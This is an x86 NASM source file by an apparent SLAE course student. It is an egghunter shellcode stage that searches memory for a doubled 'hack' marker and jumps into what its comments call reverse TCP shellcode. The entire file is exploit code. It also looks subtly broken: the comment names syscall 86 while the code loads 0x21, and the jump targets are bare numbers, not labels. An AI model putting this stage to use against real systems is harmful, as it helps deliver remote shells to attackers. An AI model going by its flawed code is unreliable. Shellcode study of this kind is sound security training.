;---------------------------------
;
; egghunter.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE-744
;
; September 2, 2016
;
;---------------------------------



global _start

section .text


_start:

	; This is our egghuter
	; it needs to search for 
	; 2 consecutive instances
	; of our 'hack' string
	; and then jump into, and execute
	; our reverse TCP shellcode
	;
	; we'll try this out with the uselib syscall 86
	; and hope we can find and execute our shell
	; in the data section

	xor edx, edx			; initialize the registers
	or dx, 0xfff			; helps set up for page size (0xfff = 4095)
	inc edx				; increase edx by 1
	lea ebx, [edx + 4]		; put the address of edx plus 4 bytes into ebx for the syscall
	xor eax, eax			; clear out eax
	mov al, 0x21			; #define __NR_uselib       86 (0x56)	
	int 0x80			; call it
	cmp al, 0xf2			; compare the return value in eax
	jz 0x2				; short jump 2 bytes if ZF set
	mov eax, 0x6861636b		; copy our comparison string into eax
	mov edi, edx			; mov our value in edx into edi
	scasd				; compare eax with dword at edi (in other words, check to see if we have 2 consecutive strings)
	jnz 0x7				; short jump if ZF not set to see if we have string
	scasd				; make the eax comparison again
	jnz 0x7				; short jump if ZF not set
	jmp edi				; we found a match! pwnage!!! 

